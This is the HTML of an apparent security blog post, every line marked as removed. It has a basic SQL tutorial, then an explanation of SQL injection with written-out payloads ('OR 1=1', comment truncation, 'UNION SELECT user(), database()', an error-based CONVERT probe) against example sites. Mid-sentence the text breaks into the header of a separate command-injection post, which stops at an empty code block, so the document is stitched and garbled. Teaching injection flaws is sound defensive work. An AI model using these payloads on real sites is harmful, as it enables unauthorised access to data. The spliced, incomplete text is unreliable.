-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-sql">
-select * from books;
-</code></pre>
-</div>
-
-<p>This pulls all columns and rows from the <code class="language-plaintext highlighter-rouge">books</code> table.</p>
-
-<h3 id="sample-output">Sample Output:</h3>
-
-<table>
-  <thead>
-    <tr>
-      <th>id</th>
-      <th>title</th>
-      <th>author</th>
-      <th>genre</th>
-    </tr>
-  </thead>
-  <tbody>
-    <tr>
-      <td>1</td>
-      <td>Cyber Shadows</td>
-      <td>Max Hollow</td>
-      <td>Thriller</td>
-    </tr>
-    <tr>
-      <td>2</td>
-      <td>Datafall</td>
-      <td>Mira Grant</td>
-      <td>Sci-Fi</td>
-    </tr>
-    <tr>
-      <td>3</td>
-      <td>Broken Protocol</td>
-      <td>L. Pierce</td>
-      <td>Mystery</td>
-    </tr>
-  </tbody>
-</table>
-
-<hr />
-
-<p>To return only certain columns:</p>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">SQL</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-sql">
-select title, author from books;
-</code></pre>
-</div>
-
-<h3 id="output">Output:</h3>
-
-<table>
-  <thead>
-    <tr>
-      <th>title</th>
-      <th>author</th>
-    </tr>
-  </thead>
-  <tbody>
-    <tr>
-      <td>Cyber Shadows</td>
-      <td>Max Hollow</td>
-    </tr>
-    <tr>
-      <td>Datafall</td>
-      <td>Mira Grant</td>
-    </tr>
-    <tr>
-      <td>Broken Protocol</td>
-      <td>L. Pierce</td>
-    </tr>
-  </tbody>
-</table>
-
-<hr />
-
-<h2 id="limit--restricting-results"><strong>LIMIT – Restricting Results</strong></h2>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">SQL</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-sql">
-select * from books limit 2;
-</code></pre>
-</div>
-
-<p>Returns the first <strong>2 rows</strong> from the table.</p>
-
-<p>To skip rows:</p>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">SQL</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-sql">
-select * from books limit 1,2;
-</code></pre>
-</div>
-
-<p>This skips the first row and returns the next two.</p>
-
-<hr />
-
-<h2 id="where---filtering-data"><strong>WHERE - Filtering Data</strong></h2>
-
-<p>Use <code class="language-plaintext highlighter-rouge">WHERE</code> to fetch rows based on conditions:</p>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">SQL</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-sql">
-select * from books where genre = 'Thriller';
-</code></pre>
-</div>
-
-<h3 id="output-1">Output:</h3>
-
-<table>
-  <thead>
-    <tr>
-      <th>id</th>
-      <th>title</th>
-      <th>author</th>
-      <th>genre</th>
-    </tr>
-  </thead>
-  <tbody>
-    <tr>
-      <td>1</td>
-      <td>Cyber Shadows</td>
-      <td>Max Hollow</td>
-      <td>Thriller</td>
-    </tr>
-  </tbody>
-</table>
-
-<p>Use <code class="language-plaintext highlighter-rouge">!=</code> to exclude:</p>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">SQL</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-sql">
-select * from books where genre != 'Thriller';
-</code></pre>
-</div>
-
-<p>Use <code class="language-plaintext highlighter-rouge">OR</code> and <code class="language-plaintext highlighter-rouge">AND</code> to stack conditions:</p>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">SQL</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-sql">
-select * from books where genre = 'Sci-Fi' or genre = 'Mystery';
-</code></pre>
-</div>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">SQL</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-sql">
-select * from books where author = 'Mira Grant' and genre = 'Sci-Fi';
-</code></pre>
-</div>
-
-<hr />
-
-<h2 id="like--pattern-matching"><strong>LIKE – Pattern Matching</strong></h2>
-
-<p>Use <code class="language-plaintext highlighter-rouge">LIKE</code> with <code class="language-plaintext highlighter-rouge">%</code> as a wildcard.</p>
-
-<p><strong>Starts with</strong>:</p>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">SQL</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-sql">
-select * from books where author like 'M%';
-</code></pre>
-</div>
-
-<p>Returns rows where the author starts with “M”.</p>
-
-<p><strong>Ends with</strong>:</p>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">SQL</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-sql">
-select * from books where title like '%l';
-</code></pre>
-</div>
-
-<p><strong>Contains</strong>:</p>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">SQL</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-sql">
-select * from books where title like '%ro%';
-</code></pre>
-</div>
-
-<hr />
-
-<h2 id="union--merging-results-from-multiple-tables"><strong>UNION – Merging Results from Multiple Tables</strong></h2>
-
-<p>Say we have a <code class="language-plaintext highlighter-rouge">books</code> table and a <code class="language-plaintext highlighter-rouge">magazines</code> table:</p>
-
-<h3 id="books-table"><code class="language-plaintext highlighter-rouge">books</code> Table:</h3>
-
-<table>
-  <thead>
-    <tr>
-      <th>title</th>
-      <th>author</th>
-    </tr>
-  </thead>
-  <tbody>
-    <tr>
-      <td>Cyber Shadows</td>
-      <td>Max Hollow</td>
-    </tr>
-    <tr>
-      <td>Datafall</td>
-      <td>Mira Grant</td>
-    </tr>
-  </tbody>
-</table>
-
-<h3 id="magazines-table"><code class="language-plaintext highlighter-rouge">magazines</code> Table:</h3>
-
-<table>
-  <thead>
-    <tr>
-      <th>title</th>
-      <th>editor</th>
-    </tr>
-  </thead>
-  <tbody>
-    <tr>
-      <td>HackWorld Monthly</td>
-      <td>Erin Voss</td>
-    </tr>
-    <tr>
-      <td>Tech Digest</td>
-      <td>Dan Irvine</td>
-    </tr>
-  </tbody>
-</table>
-
-<p>Combine both into one list:</p>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">SQL</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-sql">
-select title, author from books union select title, editor from magazines;
-</code></pre>
-</div>
-
-<hr />
-
-<h2 id="insert--adding-data"><strong>INSERT – Adding Data</strong></h2>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">SQL</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-sql">
-insert into books (title, author, genre) values ('Echoes of Null', 'J. Drayke', 'Cyberpunk');
-</code></pre>
-</div>
-
-<p>Now <code class="language-plaintext highlighter-rouge">books</code> has a new row:</p>
-
-<table>
-  <thead>
-    <tr>
-      <th>id</th>
-      <th>title</th>
-      <th>author</th>
-      <th>genre</th>
-    </tr>
-  </thead>
-  <tbody>
-    <tr>
-      <td>4</td>
-      <td>Echoes of Null</td>
-      <td>J. Drayke</td>
-      <td>Cyberpunk</td>
-    </tr>
-  </tbody>
-</table>
-
-<hr />
-
-<h2 id="update--modifying-data"><strong>UPDATE – Modifying Data</strong></h2>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">SQL</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-sql">
-update books set genre = 'Tech Noir' where title = 'Echoes of Null';
-</code></pre>
-</div>
-
-<p>Changes the genre of one specific book.</p>
-
-<hr />
-
-<h2 id="delete--removing-data"><strong>DELETE – Removing Data</strong></h2>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">SQL</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-sql">
-delete from books where author = 'Max Hollow';
-</code></pre>
-</div>
-
-<p>Deletes all books by Max Hollow.</p>
-
-<p>Or wipe the table:</p>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">SQL</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-sql">
-delete from books;
-</code></pre>
-</div>
-
-<p>All rows gone but the table still exists.</p>
-
-<h1 id="what-is-sql-injection-sqli">What is SQL Injection (SQLi)?</h1>
-<hr />
-
-<p><strong>SQL Injection (SQLi)</strong> is a vulnerability that occurs when an application takes <strong>user input</strong> and drops it directly into an <strong>SQL query</strong> without proper validation or sanitization. This opens the door for attackers to <strong>manipulate the query</strong> and extract, bypass, or destroy data.</p>
-
-<p>It’s like handing your database a loaded gun… and letting the user pull the trigger.</p>
-
-<hr />
-
-<h2 id="real-world-example--the-blog-post-trap">Real-World Example – The Blog Post Trap</h2>
-
-<p>Let’s imagine a blog site where each post has a unique ID. Posts may be <em>public</em> (ready to read) or <em>private</em> (still in draft).</p>
-
-<p>A standard blog post URL might look like this:</p>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">SQL</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-sql">
-https://cyberjournal.io/post?id=4
-</code></pre>
-</div>
-
-<p>Under the hood, the backend may run an SQL query like this:</p>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">SQL</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-sql">
-SELECT * FROM posts WHERE id=4 AND is_public=1 LIMIT 1;
-</code></pre>
-</div>
-
-<ul>
-  <li>
-    <p><code class="language-plaintext highlighter-rouge">id=4</code> — tells the database which post to fetch.</p>
-  </li>
-  <li>
-    <p><code class="language-plaintext highlighter-rouge">is_public=1</code> — filters out private drafts.</p>
-  </li>
-  <li>
-    <p><code class="language-plaintext highlighter-rouge">LIMIT 1</code> — ensures only one row is returned.</p>
-  </li>
-</ul>
-
-<p>If <code class="language-plaintext highlighter-rouge">post 4</code> is public, you see it. If it’s private (<code class="language-plaintext highlighter-rouge">is_public=0</code>), you get a “not found” page.</p>
-
-<hr />
-
-<h2 id="where-it-breaks-injecting-malicious-input">Where It Breaks Injecting Malicious Input</h2>
-
-<p>Here’s the catch: if the <strong><code class="language-plaintext highlighter-rouge">id</code></strong> parameter is used directly in the query without filtering it’s open to abuse.</p>
-
-<p>Let’s say <code class="language-plaintext highlighter-rouge">post 7</code> is a private draft.</p>
-
-<p>You try this URL:</p>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">SQL</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-sql">
-https://cyberjournal.io/post?id=7
-</code></pre>
-</div>
-
-<p>You get nothing, as expected.</p>
-
-<p>But what if you sneak in this instead?</p>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">SQLI</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-sqli">
-https://cyberjournal.io/post?id=7 OR 1=1
-</code></pre>
-</div>
-
-<p>Now the SQL query becomes:</p>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">SQL</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-sql">
-SELECT * FROM posts WHERE id=7 OR 1=1 AND is_public=1 LIMIT 1;
-</code></pre>
-</div>
-
-<p>Due to logical operator precedence, <code class="language-plaintext highlighter-rouge">1=1</code> evaluates as true bypassing the intent of the filter. But more dangerously, some devs might write queries like this:</p>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">SQL</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-sql">
-SELECT * FROM posts WHERE id=$id;
-</code></pre>
-</div>
-
-<p>And now, you pass:</p>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">SQLI</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-sqli">
-https://cyberjournal.io/post?id=7;--
-</code></pre>
-</div>
-
-<p>That transforms the SQL into:</p>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">SQLI</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-sqli">
-SELECT * FROM posts WHERE id=7;--
-</code></pre>
-</div>
-
-<p><code class="language-plaintext highlighter-rouge">--</code> is the SQL comment syntax. It disables anything after it. So if the app tried to append <code class="language-plaintext highlighter-rouge">AND is_public=1</code>, it gets ignored.</p>
-
-<p>You now view a private post.</p>
-
-<hr />
-
-<h2 id="️-why-this-happens">⚙️ Why This Happens</h2>
-
-<p>It all boils down to <strong>trusting user input</strong>. SQL engines don’t care where the data comes from they just execute the final string. If the app doesn’t escape or bind inputs safely, attackers write their own logic inside your query.</p>
-
-<h1 id="in-band-sql-injection-one-path-in-one-path-out">In-Band SQL Injection: One Path In. One Path Out.</h1>
-<hr />
-
-<p><strong>In-Band SQLi</strong> is the <em>loudest</em>, <em>simplest</em>, and <em>most direct</em> form of SQL Injection. It’s called “In-Band” because:</p>
-
-<blockquote>
-  <p>The <strong>request</strong> and <strong>response</strong> both travel the <strong>same channel</strong> usually the web browser.</p>
-</blockquote>
-
-<p>You shoot the payload ➜ the app executes it ➜ the results spill out right on the page.</p>
-
-<p>It’s fast. It’s obvious. And if it works, you’re basically jacked into the DB like it’s 1999.</p>
-
-<hr />
-
-<h3 id="use-case-comment-viewer">Use Case: Comment Viewer</h3>
-
-<p>Imagine a basic URL:</p>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">SQL</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-sql">
-https://comments.sys/view.php?cid=10
-</code></pre>
-</div>
-
-<p>The backend query might look like:</p>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">SQL</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-sql">
-SELECT name, message FROM comments WHERE cid=10;
-</code></pre>
-</div>
-
-<p>Nothing fancy. But if the input isn’t sanitized, try this:</p>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">SQLI</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-sqli">
-https://comments.sys/view.php?cid=10 UNION SELECT user(), database();
-</code></pre>
-</div>
-
-<p>Page now shows:</p>
-
-<div class="code-block-container">
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-sqli">
-Name: root@localhost
-Message: blogdb
-</code></pre>
-</div>
-
-<p>No authentication. No session. Just raw data harvested through the same request channel.</p>
-
-<hr />
-
-<h2 id="subtypes-of-in-band-sqli">Subtypes of In-Band SQLi</h2>
-
-<h4 id="1-error-based-sql-injection">1. Error-Based SQL Injection</h4>
-
-<p>This one rides on the <strong>error output</strong> from the database itself. If the backend is verbose (MySQL, MSSQL, PostgreSQL, etc.), you can throw crafted payloads and get the <strong>structure of the database dumped back at you</strong>.</p>
-
-<p><strong>Example:</strong></p>
-
-<p>Original URL:</p>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">SQL</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-sql">
-https://comments.sys/view.php?cid=10
-</code></pre>
-</div>
-
-<p>Try this:</p>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">SQLI</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-sqli">
-https://comments.sys/view.php?cid=10 AND 1=CONVERT(int,(SELECT @@version));
-</code></pre>
-</div>
-
-<p>If error messages are on, you get:</p>
-
-<p>&lt;div class=”&lt;div class="post-page"&gt;</p>
-<article class="post-container px-4 py-5 mx-auto max-w-4xl text-gray-100">
-    <header class="mb-4 border-b border-gray-600 pb-3">
-      <h1 class="text-3xl font-bold text-white">SQL Injection</h1>
-      <p class="text-sm text-gray-400">
-        June 2, 2025
-      </p>
-      <p class="text-sm text-gray-400">
-        Categories: 
-        
-          <a href="/categories/blog" class="text-gray-400 hover:text-white">blog</a>, 
-        
-          <a href="/categories/cybersecurity" class="text-gray-400 hover:text-white">cybersecurity</a>
-        
-      </p>
-    </header>
-
-    <section class="post-content prose prose-invert max-w-none text-gray-300">
-      <div class="post-page">
-  <article class="post-container px-4 py-5 mx-auto max-w-4xl text-gray-100">
-    <header class="mb-4 border-b border-gray-600 pb-3">
-      <h1 class="text-3xl font-bold text-white">Command Injection &amp; Remote Command Injection</h1>
-      
-      <p class="text-sm text-gray-400">
-        June 2, 2025
-      </p>
-      
-      <p class="text-sm text-gray-400">
-        Categories: 
-        
-          <a href="/categories/blog" class="text-gray-400 hover:text-white">blog</a>, 
-        
-          <a href="/categories/cybersecurity" class="text-gray-400 hover:text-white">cybersecurity</a>
-        
-      </p>
-      
-      
-        <p class="mt-1 text-sm text-gray-400">
-          Tags: 
-          
-            <a href="/tags/red team" class="text-gray-400 hover:text-white">red team</a>, 
-          
-            <a href="/tags/pentesting" class="text-gray-400 hover:text-white">pentesting</a>, 
-          
-            <a href="/tags/bug bounty" class="text-gray-400 hover:text-white">bug bounty</a>, 
-          
-            <a href="/tags/ctf" class="text-gray-400 hover:text-white">ctf</a>
-          
-        </p>
-      
-    </header>
-
-    
-      <div class="post-header-image">
-        <img src="https://e1.pxfuel.com/desktop-wallpaper/92/1012/desktop-wallpaper-spooky-creepy-evil-backgrounds-scary-horror-dark-evil-background.jpg" alt="Command Injection &amp; Remote Command Injection cover image" />
-      </div>
-    
-
-    <section class="post-content prose prose-invert max-w-none text-gray-300">
-      <p><em>What if a single line of input could give an attacker full control over a system? No passwords. No exploits. Just raw commands slipped in through the cracks.</em>
-That’s the threat behind <strong>Command Injection</strong> one of the most dangerous, yet often overlooked, vulnerabilities in modern applications.</p>
-
-<p>At its core, Command Injection happens when user-supplied data is passed directly to the system shell without proper sanitization. It’s like handing a stranger the mic and trusting they’ll only say what you expect. But attackers don’t play nice they chain extra commands, escalate privileges, and pivot deeper into your infrastructure.</p>
-
-<p><strong>Remote Command Injection</strong> (RCI) raises the stakes. It’s the same flaw, but now it’s exposed over a network. An attacker can be miles or continents away, injecting commands into a server, IoT device, or web app, turning an external input point into an internal compromise.</p>
-
-<p>These vulnerabilities aren’t theoretical. They’re actively exploited in the wild used to drop web shells, create backdoors, and hijack entire environments. Understanding how they work is the first step to preventing a silent breach.</p>
-
-<h1 id="breaking-down-rce-through-a-simple-invoice-app">Breaking Down RCE Through a Simple Invoice App</h1>
-
-<p>Imagine you log into an app and click <strong>Generate Invoice</strong>. Looks all normal, right? Here’s what happens:</p>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*jzNx0nUYgsmHFZJZG2qccA.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-
-<ol>
-  <li>You hit the button, and it shows <strong>Invoice #001</strong> with client info and total amount. Nothing sketchy.</li>
-</ol>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*pRgY0fG5l8m_zkZDdPXuAg.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-
-<ol>
-  <li>But check the URL closely:</li>
-</ol>
-<div class="code-block-container">
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-powershell">
